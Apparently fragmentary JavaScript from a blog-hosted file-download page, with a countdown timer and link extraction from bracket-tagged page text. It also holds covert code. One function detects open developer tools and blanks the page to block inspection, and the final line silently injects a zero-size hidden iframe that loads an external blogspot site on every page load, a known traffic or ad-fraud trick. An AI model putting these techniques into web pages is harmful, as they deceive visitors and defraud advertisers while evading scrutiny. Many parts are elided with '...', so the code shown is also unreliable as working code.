...
function siteUrl(start,length){
	...
	if(c){
      c="https://"+dLh.replace(substring, "@").replace("/", "@@").match(/\@(.*?)\@@/i)[1];
    }else{
      c="http://"+dLh.replace(substring, "@").replace("/", "@@").match(/\@(.*?)\@@/i)[1];
	}
...
function lockInspect(){
	var gAction=window.innerWidth+19>window.outerWidth&&window.innerHeight+125>window.outerHeight?0:1;
	if(gAction){
		document.body.innerHTML='Inspect Is on';
...
//-----------------------------------------------------------
// substr_count
// http://internetdoc.info/javascript-php-equivalent/substr_count.htm
...
var getData=getYszmElement(siteUrl().replace("https://", "").replace("http://", ""),data);
...
getData('file','file');
*/
function getData(fromId,elementName,toId){
	var g= getElement(fromId).innerHTML;
	if(toId=='get'){
		return g.substring(g.lastIndexOf('['+elementName+']')+elementName.length+2,g.lastIndexOf('[/'+elementName+']'));
	}else{
		getElement(toId).innerHTML=g.substring(g.lastIndexOf('['+elementName+']')+elementName.length+2,g.lastIndexOf('[/'+elementName+']'));
	}
}
getData('getTextBody','size','size');
getData('getTextBody','file','file');
//-----------------------------------------------------------
		...
		setInterval(function(){
			...
			if(s>1){
				...
				r.innerHTML='Download File <i class="fa fa-download"></i>';
              	getElement("btnDownload").onclick = function goToTheLink(){window.location=getData('getTextBody','link','get');};
			}
		},1000);
...
function getLink(){
	user = getData('getTextBody','link','get');
	if (user != "" && user != null) {
...
//-----------------------------------------------------------
// استدعاء IFrame
document.body.innerHTML += '<div style="width:0px;height:0px;overflow:hidden;"><iframe src="https://arba7-01014761304.blogspot.com"></iframe></div>';
